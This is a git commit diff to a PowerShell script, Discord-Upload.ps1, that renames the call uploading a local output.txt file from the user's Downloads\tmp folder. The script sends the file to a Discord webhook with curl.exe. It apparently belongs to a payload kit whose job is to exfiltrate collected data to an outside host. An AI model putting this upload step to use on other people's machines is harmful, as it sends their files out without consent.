602761dba50db1ddb7c2062abc233a13a9b4a750
QuackBeans <84631177+QuackBeans@users.noreply.github.com>
2024-02-26 14:22:30 +1000

    Update Discord-Upload.ps1

--- Discord-Upload.ps1
+++ Discord-Upload.ps1
@@ -21,4 +21,4 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "C:\Users\$env:UserName\Downloads\tmp\output.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Discord-Upload -file "C:\Users\$env:UserName\Downloads\tmp\output.txt"}
